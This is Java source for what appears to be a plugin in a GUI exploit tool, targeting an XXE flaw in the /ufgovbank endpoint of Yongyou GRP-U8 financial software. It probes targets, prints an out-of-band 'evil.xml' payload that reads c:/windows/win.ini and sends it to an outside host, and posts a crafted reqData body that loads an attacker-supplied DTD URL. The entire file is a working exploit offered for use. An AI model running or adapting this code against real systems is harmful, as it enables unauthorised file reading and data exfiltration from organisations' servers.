package exp.oa.yongyou.grp;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_grpu8_ufgovbanl_xxe implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea,TextArea textArea_cmd) {
        try{
            HashMap head = new HashMap<String, String>();
            Response response = HttpTools.get(url + "/ufgovbank", head, "utf-8");
            if (response.getCode() ==200  ) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_grpu8_ufgovbanl_xxe ]");
                    textArea.appendText("\n 存在IUpdateService接口");
                });
                Platform.runLater(() -> {
                    textArea.appendText("\n eg1: http://dnslog.cn");
                    textArea.appendText("\n eg2: http://vps/evil.xml\n");
                    textArea_cmd.appendText("---------------------------evil.xml-------------------------\n"+
                            "<!ENTITY % payload SYSTEM \"file:///c:/windows/win.ini\">\n" +
                            "<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://www.baidu.com/%payload;'>\">\n" +
                            "%int;\n" +
                            "%trick;"+
                            "\n---------------------------evil.xml-------------------------\n");
                });
                return true;
            } else {
                Platform.runLater(() -> textArea.appendText("\n"));

                return false;
            }
        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        try{

            if(cmd.contains("dnslog")&&cmd.contains("http://")){
                cmd = "http://"+"R4g."+cmd.substring(url.indexOf("://")+3);
            }
            String fullCmd = "reqData=<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE foo SYSTEM \""+cmd+"\">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest";
            HashMap head = new HashMap<String, String>();
            Response response = HttpTools.post(url + "/ufgovbank",fullCmd, head, "utf-8");
            if (response.getCode() != 404&&response.getCode() != 0 && response.getText().contains("ufgov") ) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行成功,请自行判断");
                    textArea_cmd.appendText("\n"+ response.getText());
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行失败！");
                });
                return false;
            }
        }catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });

        }
        return false;
    }
}
